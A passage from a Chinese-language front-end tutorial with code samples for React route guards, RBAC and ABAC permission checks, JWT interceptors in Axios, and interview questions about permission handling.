class="hljs-attr">route.element</span></span></span><br><span class="hljs-tag"><span class="language-xml">        ) <span class="hljs-attr">:</span> (</span></span><br><span class="hljs-tag"><span class="language-xml">          &lt;<span class="hljs-attr">RouteGuard</span> <span class="hljs-attr">roles</span>=<span class="hljs-string">&#123;route.roles&#125;</span>&gt;</span></span><br><span class="language-xml">            &#123;route.element&#125;</span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">RouteGuard</span>&gt;</span></span><br><span class="language-xml">        )</span><br><span class="language-xml">      &#125;</span><br><span class="language-xml">    &gt;</span><br><span class="language-xml">      &#123;route.children &amp;&amp; renderRoutes(route.children)&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Route</span>&gt;</span></span><br>  ));<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>RBAC（基于角色的访问控制）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 权限服务</span><br><span class="hljs-keyword">const</span> permissionService = &#123;<br>  <span class="hljs-comment">// 角色权限映射</span><br>  <span class="hljs-attr">roles</span>: &#123;<br>    <span class="hljs-attr">guest</span>: [<span class="hljs-string">&#x27;view_public&#x27;</span>],<br>    <span class="hljs-attr">user</span>: [<span class="hljs-string">&#x27;view_dashboard&#x27;</span>, <span class="hljs-string">&#x27;edit_profile&#x27;</span>],<br>    <span class="hljs-attr">admin</span>: [<span class="hljs-string">&#x27;manage_users&#x27;</span>, <span class="hljs-string">&#x27;view_reports&#x27;</span>, <span class="hljs-string">&#x27;edit_settings&#x27;</span>],<br>    <span class="hljs-attr">superadmin</span>: [<span class="hljs-string">&#x27;*&#x27;</span>] <span class="hljs-comment">// 所有权限</span><br>  &#125;,<br>  <br>  <span class="hljs-comment">// 检查权限</span><br>  <span class="hljs-title function_">hasPermission</span>(<span class="hljs-params">user, requiredPermission</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!user || !user.<span class="hljs-property">role</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <br>    <span class="hljs-keyword">const</span> userPermissions = <span class="hljs-variable language_">this</span>.<span class="hljs-property">roles</span>[user.<span class="hljs-property">role</span>] || [];<br>    <br>    <span class="hljs-keyword">return</span> userPermissions.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;*&#x27;</span>) || <br>           userPermissions.<span class="hljs-title function_">includes</span>(requiredPermission);<br>  &#125;<br>&#125;;<br><br><span class="hljs-comment">// 权限检查钩子</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">usePermission</span> = (<span class="hljs-params">requiredPermission</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> &#123; user &#125; = <span class="hljs-title function_">useAuth</span>();<br>  <br>  <span class="hljs-keyword">return</span> permissionService.<span class="hljs-title function_">hasPermission</span>(user, requiredPermission);<br>&#125;;<br><br><span class="hljs-comment">// 使用示例</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">AnalyticsPage</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> canViewReports = <span class="hljs-title function_">usePermission</span>(<span class="hljs-string">&#x27;view_reports&#x27;</span>);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      &#123;canViewReports ? (</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">AnalyticsChart</span> /&gt;</span></span><br><span class="language-xml">      ) : (</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;permission-warning&quot;</span>&gt;</span></span><br><span class="language-xml">          您没有查看报表的权限</span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      )&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ABAC（基于属性的访问控制）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ABAC 策略引擎</span><br><span class="hljs-keyword">const</span> abacEngine = &#123;<br>  <span class="hljs-title function_">evaluate</span>(<span class="hljs-params">policy, context</span>) &#123;<br>    <span class="hljs-comment">// 简化版策略评估</span><br>    <span class="hljs-keyword">return</span> policy.<span class="hljs-property">rules</span>.<span class="hljs-title function_">every</span>(<span class="hljs-function"><span class="hljs-params">rule</span> =&gt;</span> &#123;<br>      <span class="hljs-keyword">const</span> value = context[rule.<span class="hljs-property">attribute</span>];<br>      <span class="hljs-keyword">switch</span> (rule.<span class="hljs-property">operator</span>) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;eq&#x27;</span>: <span class="hljs-keyword">return</span> value == rule.<span class="hljs-property">value</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;gt&#x27;</span>: <span class="hljs-keyword">return</span> value &gt; rule.<span class="hljs-property">value</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;in&#x27;</span>: <span class="hljs-keyword">return</span> rule.<span class="hljs-property">value</span>.<span class="hljs-title function_">includes</span>(value);<br>        <span class="hljs-attr">default</span>: <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>      &#125;<br>    &#125;);<br>  &#125;<br>&#125;;<br><br><span class="hljs-comment">// 项目访问权限检查</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">useProjectAccess</span> = (<span class="hljs-params">projectId</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> &#123; user &#125; = <span class="hljs-title function_">useAuth</span>();<br>  <span class="hljs-keyword">const</span> [project] = <span class="hljs-title function_">useFetchProject</span>(projectId);<br>  <br>  <span class="hljs-keyword">const</span> canEdit = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (!user || !project) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <br>    <span class="hljs-keyword">const</span> context = &#123;<br>      <span class="hljs-attr">userId</span>: user.<span class="hljs-property">id</span>,<br>      <span class="hljs-attr">userRole</span>: user.<span class="hljs-property">role</span>,<br>      <span class="hljs-attr">projectOwner</span>: project.<span class="hljs-property">ownerId</span>,<br>      <span class="hljs-attr">projectStatus</span>: project.<span class="hljs-property">status</span>,<br>      <span class="hljs-attr">teamMembers</span>: project.<span class="hljs-property">teamMembers</span><br>    &#125;;<br>    <br>    <span class="hljs-keyword">const</span> editPolicy = &#123;<br>      <span class="hljs-attr">rules</span>: [<br>        &#123; <span class="hljs-attr">attribute</span>: <span class="hljs-string">&#x27;userRole&#x27;</span>, <span class="hljs-attr">operator</span>: <span class="hljs-string">&#x27;in&#x27;</span>, <span class="hljs-attr">value</span>: [<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;pm&#x27;</span>] &#125;,<br>        &#123; <br>          <span class="hljs-attr">attribute</span>: <span class="hljs-string">&#x27;projectStatus&#x27;</span>, <br>          <span class="hljs-attr">operator</span>: <span class="hljs-string">&#x27;neq&#x27;</span>, <br>          <span class="hljs-attr">value</span>: <span class="hljs-string">&#x27;archived&#x27;</span> <br>        &#125;,<br>        &#123;<br>          <span class="hljs-attr">anyOf</span>: [<br>            &#123; <span class="hljs-attr">attribute</span>: <span class="hljs-string">&#x27;projectOwner&#x27;</span>, <span class="hljs-attr">operator</span>: <span class="hljs-string">&#x27;eq&#x27;</span>, <span class="hljs-attr">value</span>: user.<span class="hljs-property">id</span> &#125;,<br>            &#123; <span class="hljs-attr">attribute</span>: <span class="hljs-string">&#x27;teamMembers&#x27;</span>, <span class="hljs-attr">operator</span>: <span class="hljs-string">&#x27;in&#x27;</span>, <span class="hljs-attr">value</span>: user.<span class="hljs-property">id</span> &#125;<br>          ]<br>        &#125;<br>      ]<br>    &#125;;<br>    <br>    <span class="hljs-keyword">return</span> abacEngine.<span class="hljs-title function_">evaluate</span>(editPolicy, context);<br>  &#125;, [user, project]);<br>  <br>  <span class="hljs-keyword">return</span> &#123; canEdit &#125;;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="企业级最佳实践-3"><a href="#企业级最佳实践-3" class="headerlink" title="企业级最佳实践"></a>企业级最佳实践</h3><p><strong>路由元数据方案 (React Router 6.4+)</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 使用loader实现权限控制</span><br><span class="hljs-keyword">const</span> router = <span class="hljs-title function_">createBrowserRouter</span>([<br>  &#123;<br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&quot;/admin&quot;</span>,<br>    <span class="hljs-attr">element</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">AdminLayout</span> /&gt;</span></span>,<br>    <span class="hljs-attr">loader</span>: <span class="hljs-title function_">async</span> () =&gt; &#123;<br>      <span class="hljs-comment">// 权限检查</span><br>      <span class="hljs-keyword">const</span> &#123; user &#125; = <span class="hljs-keyword">await</span> authService.<span class="hljs-title function_">getCurrentUser</span>();<br>      <br>      <span class="hljs-keyword">if</span> (!user) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-title function_">redirect</span>(<span class="hljs-string">&quot;/login&quot;</span>);<br>      &#125;<br>      <br>      <span class="hljs-keyword">if</span> (user.<span class="hljs-property">role</span> !== <span class="hljs-string">&quot;admin&quot;</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(<span class="hljs-string">&quot;Forbidden&quot;</span>, &#123; <span class="hljs-attr">status</span>: <span class="hljs-number">403</span> &#125;);<br>      &#125;<br>      <br>      <span class="hljs-keyword">return</span> &#123; user &#125;;<br>    &#125;,<br>    <span class="hljs-attr">errorElement</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">AdminErrorBoundary</span> /&gt;</span></span>,<br>    <span class="hljs-attr">children</span>: [<br>      &#123; <span class="hljs-attr">index</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">element</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">AdminDashboard</span> /&gt;</span></span> &#125;,<br>      &#123; <span class="hljs-attr">path</span>: <span class="hljs-string">&quot;users&quot;</span>, <span class="hljs-attr">element</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">UserManagement</span> /&gt;</span></span> &#125;<br>    ]<br>  &#125;<br>]);<br></code></pre></td></tr></table></figure><p><strong>JWT 认证集成方案</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Axios 请求拦截器</span><br>api.<span class="hljs-property">interceptors</span>.<span class="hljs-property">request</span>.<span class="hljs-title function_">use</span>(<span class="hljs-function"><span class="hljs-params">config</span> =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> token = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;access_token&#x27;</span>);<br>  <span class="hljs-keyword">if</span> (token) &#123;<br>    config.<span class="hljs-property">headers</span>.<span class="hljs-property">Authorization</span> = <span class="hljs-string">`Bearer <span class="hljs-subst">$&#123;token&#125;</span>`</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> config;<br>&#125;);<br><br><span class="hljs-comment">// Axios 响应拦截器 (处理token刷新)</span><br>api.<span class="hljs-property">interceptors</span>.<span class="hljs-property">response</span>.<span class="hljs-title function_">use</span>(<br>  <span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response,<br>  <span class="hljs-keyword">async</span> error =&gt; &#123;<br>    <span class="hljs-keyword">const</span> originalRequest = error.<span class="hljs-property">config</span>;<br>    <br>    <span class="hljs-keyword">if</span> (error.<span class="hljs-property">response</span>.<span class="hljs-property">status</span> === <span class="hljs-number">401</span> &amp;&amp; !originalRequest.<span class="hljs-property">_retry</span>) &#123;<br>      originalRequest.<span class="hljs-property">_retry</span> = <span class="hljs-literal">true</span>;<br>      <br>      <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// 刷新token</span><br>        <span class="hljs-keyword">const</span> &#123; data &#125; = <span class="hljs-keyword">await</span> <span class="hljs-title function_">refreshToken</span>();<br>        <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&#x27;access_token&#x27;</span>, data.<span class="hljs-property">access_token</span>);<br>        <br>        <span class="hljs-comment">// 重试原始请求</span><br>        originalRequest.<span class="hljs-property">headers</span>.<span class="hljs-property">Authorization</span> = <span class="hljs-string">`Bearer <span class="hljs-subst">$&#123;data.access_token&#125;</span>`</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">api</span>(originalRequest);<br>      &#125; <span class="hljs-keyword">catch</span> (refreshError) &#123;<br>        <span class="hljs-comment">// 刷新失败，跳转登录</span><br>        store.<span class="hljs-title function_">dispatch</span>(<span class="hljs-title function_">logout</span>());<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(refreshError);<br>      &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error);<br>  &#125;<br>);<br></code></pre></td></tr></table></figure><p><strong>权限指令式组件</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 权限控制组件</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">Permission</span> = (<span class="hljs-params">&#123; </span><br><span class="hljs-params">  children, </span><br><span class="hljs-params">  requiredPermission,</span><br><span class="hljs-params">  fallback = <span class="hljs-literal">null</span> </span><br><span class="hljs-params">&#125;</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> hasPermission = <span class="hljs-title function_">usePermission</span>(requiredPermission);<br>  <br>  <span class="hljs-keyword">if</span> (!hasPermission) &#123;<br>    <span class="hljs-keyword">return</span> fallback;<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> children;<br>&#125;;<br><br><span class="hljs-comment">// 使用示例</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">UserManagementPage</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>用户管理<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml">      </span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Permission</span> <span class="hljs-attr">requiredPermission</span>=<span class="hljs-string">&quot;create_user&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>创建新用户<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">Permission</span>&gt;</span></span><br><span class="language-xml">      </span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Permission</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">requiredPermission</span>=<span class="hljs-string">&quot;delete_user&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;text-muted&quot;</span>&gt;</span>您无权删除用户<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>&#125;</span><br><span class="language-xml">      &gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">UserTable</span> <span class="hljs-attr">withActions</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">Permission</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="面试高频问题解决方案"><a href="#面试高频问题解决方案" class="headerlink" title="面试高频问题解决方案"></a>面试高频问题解决方案</h3><p><strong>Q：路由切换时的权限验证</strong></p><p>问题：用户权限变更后，已打开页面的权限未更新</p><p>解决方案：事件总线通知 + 全局状态监听</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 权限变更事件</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">AuthEvents</span> = &#123;<br>  <span class="hljs-attr">PERMISSION_CHANGED</span>: <span class="hljs-string">&#x27;permission_changed&#x27;</span><br>&#125;;<br><br><span class="hljs-comment">// 在权限服务中</span><br>authService.<span class="hljs-property">onPermissionsChanged</span> = <span class="hljs-function">() =&gt;</span> &#123;<br>  eventBus.<span class="hljs-title function_">emit</span>(<span class="hljs-title class_">AuthEvents</span>.<span class="hljs-property">PERMISSION_CHANGED</span>);<br>&#125;;<br><br><span class="hljs-comment">// 在路由守卫组件中</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">RouteGuard</span> = (<span class="hljs-params">&#123; children, roles &#125;</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> [permissionsValid, setPermissionsValid] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">true</span>);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">handler</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>      <span class="hljs-title function_">setPermissionsValid</span>(<span class="hljs-title function_">checkPermissions</span>(roles));<br>    &#125;;<br>    <br>    eventBus.<span class="hljs-title function_">on</span>(<span class="hljs-title class_">AuthEvents</span>.<span class="hljs-property">PERMISSION_CHANGED</span>, handler);<br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> eventBus.<span class="hljs-title function_">off</span>(handler);<br>  &#125;, [roles]);<br>  <br>  <span class="hljs-keyword">if</span> (!permissionsValid) &#123;<br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Navigate</span> <span class="hljs-attr">to</span>=<span class="hljs-string">&quot;/unauthorized&quot;</span> <span class="hljs-attr">replace</span> /&gt;</span></span>;<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> children;<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>Q：按钮级权限的防抖控制</strong></p><p>问题：频繁点击权限按钮导致多次权限检查请求</p><p>解决方案：权限缓存 + 防抖机制</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">useCachedPermission</span> = (<span class="hljs-params">permission, ttl = <span class="hljs-number">5000</span></span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> [cache, setCache] = <span class="hljs-title function_">useState</span>(&#123;&#125;);<br>  <br>  <span class="hljs-keyword">const</span> check = <span class="hljs-title function_">useCallback</span>(<span class="hljs-title function_">async</span> () =&gt; &#123;<br>    <span class="hljs-keyword">const</span> now = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();<br>    <br>    <span class="hljs-keyword">if</span> (cache[permission] &amp;&amp; cache[permission].<span class="hljs-property">expires</span> &gt; now) &#123;<br>      <span class="hljs-keyword">return</span> cache[permission].<span class="hljs-property">result</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> api.<span class="hljs-title function_">checkPermission</span>(permission);<br>    <span class="hljs-title function_">setCache</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> (&#123;<br>      ...prev,<br>      [permission]: &#123; result, <span class="hljs-attr">expires</span>: now + ttl &#125;<br>    &#125;));<br>    <br>    <span class="hljs-keyword">return</span> result;<br>  &#125;, [permission, ttl, cache]);<br>  <br>  <span class="hljs-keyword">return</span> check;<br>&#125;;<br><br><span class="hljs-comment">// 使用示例</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">DeleteButton</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> checkDeletePermission = <span class="hljs-title function_">useCachedPermission</span>(<span class="hljs-string">&#x27;delete_item&#x27;</span>);<br>  <span class="hljs-keyword">const</span> [disabled, setDisabled] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">true</span>);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-title function_">checkDeletePermission</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">hasPermission</span> =&gt;</span> &#123;<br>      <span class="hljs-title function_">setDisabled</span>(!hasPermission);<br>    &#125;);<br>  &#125;, []);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> </span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">disabled</span>=<span class="hljs-string">&#123;disabled&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;handleDelete&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">    &gt;</span></span><br><span class="language-xml">      删除</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Q：动态菜单权限控制</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 动态生成菜单</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">useAuthorizedMenu</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> &#123; user &#125; = <span class="hljs-title function_">useAuth</span>();<br>  <span class="hljs-keyword">const</span> [menuItems, setMenuItems] = <span class="hljs-title function_">useState</span>([]);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">loadMenu</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"></span>) =&gt; &#123;<br>      <span class="hljs-keyword">const</span> allItems = <span class="hljs-keyword">await</span> api.<span class="hljs-title function_">getMenuItems</span>();<br>      <br>      <span class="hljs-keyword">const</span> authorizedItems = <span class="hljs-keyword">await</span> <span 